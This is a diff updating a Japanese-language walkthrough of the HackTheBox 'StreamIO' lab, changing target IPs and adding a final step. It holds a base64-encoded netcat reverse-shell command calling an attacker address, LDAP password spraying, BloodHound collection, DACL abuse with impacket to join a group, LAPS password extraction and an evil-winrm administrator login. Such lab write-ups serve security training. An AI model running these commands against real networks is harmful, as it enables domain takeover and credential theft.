@@ -811,7 +811,7 @@ c3lzdGVtKCJuYy5leGUgLWUgY21kIDEwLjEwLjE2LjkgNDQ0NCIpOwo=
 ```powershell
 └─$ rlwrap nc -lnvp 4444
 listening on [any] 4444 ...
-connect to [10.10.16.9] from (UNKNOWN) [10.129.70.54] 52458
+connect to [10.10.16.9] from (UNKNOWN) [10.129.62.39] 52458
 
 PS C:\inetpub\streamio.htb\admin> whoami
 streamio\yoshihide
@@ -934,7 +934,7 @@ The command completed successfully.
 ということでwinrmでログイン成功  
 ようやくユーザフラグゲット
 ```powershell
-└─$ evil-winrm -i 10.129.70.54 -u nikk37 -p get_dem_girls2@yahoo.com       
+└─$ evil-winrm -i 10.129.62.39 -u nikk37 -p get_dem_girls2@yahoo.com       
                                         
 Evil-WinRM shell v3.7
                                         
@@ -1189,16 +1189,90 @@ https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
 https://slack.streamio.htb:b'JDgodd',b'password@12'
 ```
 ４つのユーザのうち、nikk37のパスワードは判明・c:\users\配下にadminは存在しないことを確認済み  
-yoshihideとJDgoddでブルートフォースログイン、結果jdgoddでログイン成功
+yoshihideとjdgoddでブルートフォースログイン、結果jdgoddでログイン成功
 ```sh
-└─$ netexec ldap 10.129.234.107 -u yohsihide -p passwords.txt
-LDAP        10.129.234.107  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
-LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:JDg0dd1s@d0p3cr3@t0r 
-LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:n1kk1sd0p3t00:)
-LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:paddpadd@12
-LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:password@12 
+└─$ netexec ldap 10.129.62.39 -u yohsihide -p passwords.txt
+LDAP        10.129.62.39  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
+LDAP        10.129.62.39  389    DC               [-] streamIO.htb\yohsihide:JDg0dd1s@d0p3cr3@t0r 
+LDAP        10.129.62.39  389    DC               [-] streamIO.htb\yohsihide:n1kk1sd0p3t00:)
+LDAP        10.129.62.39  389    DC               [-] streamIO.htb\yohsihide:paddpadd@12
+LDAP        10.129.62.39  389    DC               [-] streamIO.htb\yohsihide:password@12 
 
-└─$ netexec ldap 10.129.234.107 -u jdgodd -p passwords.txt
-LDAP        10.129.234.107  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
-LDAP        10.129.234.107  389    DC               [+] streamIO.htb\jdgodd:JDg0dd1s@d0p3cr3@t0r 
+└─$ netexec ldap 10.129.62.39 -u jdgodd -p passwords.txt
+LDAP        10.129.62.39  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
+LDAP        10.129.62.39  389    DC               [+] streamIO.htb\jdgodd:JDg0dd1s@d0p3cr3@t0r 
+```
+
+
+## STEP 9
+bloodhoundを回す
+```sh
+└─$ netexec ldap 10.129.62.39 --dns-server 10.129.62.39 -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' --bloodhound --collection All
+LDAP        10.129.62.39    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
+LDAP        10.129.62.39    389    DC               [+] streamIO.htb\jdgodd:JDg0dd1s@d0p3cr3@t0r 
+LDAP        10.129.62.39    389    DC               Resolved collection methods: container, objectprops, group, rdp, localadmin, session, psremote, trusts, dcom, acl
+LDAP        10.129.62.39    389    DC               Done in 01M 36S
+LDAP        10.129.62.39    389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.129.62.39_2025-11-22_014504_bloodhound.zip
+```
+jdgoddのwriteownerであるグループは、LAPSを使用できるみたい  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_14.png">
+まずはaclを編集、
+```sh
+└─$ impacket-dacledit -ts -dc-ip 10.129.62.39 -principal 'jdgodd' -target 'core staff' -action write -rights WriteMembers 'streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[2025-11-22 02:16:34] [*] DACL backed up to dacledit-20251122-021634.bak
+[2025-11-22 02:16:35] [*] DACL modified successfully!
+
+└─$ impacket-dacledit -ts -dc-ip 10.129.62.39 -principal 'jdgodd' -target 'core staff' -action read 'streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[2025-11-22 02:16:54] [*] Parsing DACL
+[2025-11-22 02:16:57] [*] Printing parsed DACL
+[2025-11-22 02:16:57] [*] Filtering results for SID (S-1-5-21-1470860369-1569627196-4264678630-1104)
+[2025-11-22 02:16:57] [*]   ACE[0] info                
+[2025-11-22 02:16:57] [*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
+[2025-11-22 02:16:57] [*]     ACE flags                 : None
+[2025-11-22 02:16:57] [*]     Access mask               : ReadProperty, WriteProperty
+[2025-11-22 02:16:57] [*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
+[2025-11-22 02:16:57] [*]     Object type (GUID)        : Self-Membership (bf9679c0-0de6-11d0-a285-00aa003049e2)
+[2025-11-22 02:16:57] [*]     Trustee (SID)             : JDgodd (S-1-5-21-1470860369-1569627196-4264678630-1104)
+[2025-11-22 02:16:57] [*]   ACE[3] info                
+[2025-11-22 02:16:57] [*]     ACE Type                  : ACCESS_ALLOWED_ACE
+[2025-11-22 02:16:57] [*]     ACE flags                 : None
+[2025-11-22 02:16:57] [*]     Access mask               : WriteOwner (0x80000)
+[2025-11-22 02:16:57] [*]     Trustee (SID)             : JDgodd (S-1-5-21-1470860369-1569627196-4264678630-1104)
+```
+```sh
+└─$ impacket-net 'streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r@10.129.62.39' group -name 'core staff' -join jdgodd                                                     
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Adding user account 'jdgodd' to group 'core staff'
+[+] User account added to core staff succesfully!
+
+└─$ impacket-net 'streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r@10.129.62.39' group -name 'core staff'             
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+  1. JDgodd
+```
+```sh
+└─$ impacket-GetLAPSPassword -ts -dc-ip 10.129.62.39 'streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Host  LAPS Username  LAPS Password   LAPS Password Expiration  LAPSv2 
+----  -------------  --------------  ------------------------  ------
+DC$   N/A            r{67YYWc6T3e2I  2025-11-23 08:33:54       False
+```
+```powershell
+└─$ evil-winrm -i 10.129.62.39 -u administrator -p 'r{67YYWc6T3e2I'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../../martin/desktop/root.txt
+76f4a3b63f455039df7c2cfed2f0f6e7
 ```
